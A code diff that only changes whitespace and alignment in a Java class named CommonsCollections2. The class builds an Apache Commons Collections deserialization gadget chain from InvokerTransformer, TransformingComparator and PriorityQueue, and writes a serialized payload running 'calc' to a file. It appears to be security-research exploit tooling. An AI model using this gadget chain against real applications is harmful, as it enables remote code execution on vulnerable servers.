@@ -13,8 +13,8 @@ import java.util.PriorityQueue;
 
 public class CommonsCollections2 {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous = new FileOutputStream("6666.ser");
+        byte[]           bytes = getBytes(PayloadType.command, "calc");
+        FileOutputStream fous  = new FileOutputStream("6666.ser");
         fous.write(bytes);
         fous.close();
     }
@@ -26,7 +26,7 @@ public class CommonsCollections2 {
         final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
         // create queue with numbers and basic comparator
-        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
 
         // stub data for replacement later
         queue.add(1);
@@ -42,7 +42,7 @@ public class CommonsCollections2 {
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baous);
+        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
         oos.writeObject(queue);
         byte[] bytes = baous.toByteArray();
         oos.close();
